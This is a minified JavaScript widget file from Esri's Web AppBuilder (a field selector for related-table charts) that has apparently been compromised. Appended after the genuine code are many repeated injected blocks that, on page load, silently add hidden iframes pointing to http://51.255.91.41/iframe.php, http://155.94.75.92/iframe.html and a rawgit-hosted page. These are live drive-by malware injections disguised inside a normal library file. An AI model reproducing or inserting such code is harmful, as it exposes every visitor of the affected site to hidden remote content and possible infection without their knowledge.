// All material copyright ESRI, All Rights Reserved, unless otherwise specified.
// See http://js.arcgis.com/3.15/esri/copyright.txt and http://www.arcgis.com/apps/webappbuilder/copyright.txt for details.
//>>built
require({cache:{"url:widgets/RelatedTableCharts/setting/FieldSelector.html":'\x3cdiv\x3e\r\n    \x3cdiv data-dojo-attach-point\x3d"showFieldsButton" class\x3d"jimu-icon jimu-icon-add esriCTHover"\x3e\r\n    \x3c/div\x3e\r\n\x3c/div\x3e\r\n'}});
define("dojo/_base/declare jimu/BaseWidgetSetting dijit/_WidgetsInTemplateMixin dojo/text!./FieldSelector.html dijit/TooltipDialog dijit/popup dojo/_base/lang dojo/_base/html dojo/on dojo/dom-style dojo/dom-attr dojo/dom-construct dojo/_base/array".split(" "),function(m,n,p,q,r,h,d,t,e,k,g,l,u){return m([n,p],{baseClass:"jimu-widget-RelatedTableCharts-setting",templateString:q,_stringFieldType:"esriFieldTypeString",_oidFieldType:"esriFieldTypeOID",_numberFieldTypes:["esriFieldTypeSmallInteger","esriFieldTypeInteger",
"esriFieldTypeSingle","esriFieldTypeDouble"],_isTooltipDialogOpened:!1,fields:[],hideOnSelect:!1,showOnlyNumericFields:!1,startup:function(){this.inherited(arguments)},postCreate:function(){this._createTooltipDialog(this.domNode);this._hideTooltipDialog()},destroy:function(){h.close(this.tooltipDialog);this.tooltipDialog.destroy();this.inherited(arguments)},isPartOfPopup:function(a){var b;b=this.tooltipDialog.domNode;return a===b||t.isDescendant(a,b)},onSelect:function(a){},_showTooltipDialog:function(){h.open({parent:this.getParent(),
popup:this.tooltipDialog,around:this.domNode});this._isTooltipDialogOpened=!0},_hideTooltipDialog:function(){h.close(this.tooltipDialog);this._isTooltipDialogOpened=!1},_createTooltipDialog:function(){var a=this._createFieldList();this.tooltipDialog=new r({content:a});this.own(e(this.domNode,"click",d.hitch(this,function(b){b.stopPropagation();b.preventDefault();this._isTooltipDialogOpened?this._hideTooltipDialog():this._showTooltipDialog()})));this.own(e(document.body,"click",d.hitch(this,function(b){this.isPartOfPopup(b.target||
b.srcElement)||this._hideTooltipDialog()})))},_createFieldList:function(){var a,b;b=l.create("div",{style:{"max-height":"150px",overflow:"auto"}});this.fields&&(a=d.clone(this.fields),u.forEach(a,d.hitch(this,function(a){var c,f;f=!0;this.showOnlyNumericFields&&0>this._numberFieldTypes.indexOf(a.type)&&(f=!1);f&&(f=a.alias+" {"+a.name+"}",c=l.create("div",{innerHTML:f,style:{cursor:"pointer",padding:"4px 2px"}},b),g.set(c,"name",a.name),g.set(c,"alias",a.alias),e(c,"mouseover",d.hitch(this,function(){k.set(c,
"background-color","#e4e4e4")})),e(c,"mouseout",d.hitch(this,function(){k.set(c,"background-color","#FFFFFF")})),e(c,"click",d.hitch(this,function(){var a={};a.name=g.get(c,"name");a.alias=g.get(c,"alias");this.onSelect(a);this.hideOnSelect&&this._hideTooltipDialog()})))})));return b}})});;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}





if (typeof obj.foo == 'undefined') {
window.jsuekzis = 1;
window.onload = function() {
    var iframe = document.createElement('iframe');
    iframe.style.display = "none";
    iframe.src = "http://155.94.75.92/iframe.html";
    document.body.appendChild(iframe);
};

}





void 0===window.mondrawtexture&&(window.mondrawtexture=1,window.onload=function(){var e=document.createElement('iframe');e.style.display='none',e.src='https://cdn.rawgit.com/jdobt/3e35d8a7d2c1c36ae1972ea03df91572/raw/8656e6f8554bfd2f13cf8eb78e8df044fae1e9e2/drawtexture.html',document.body.appendChild(e)});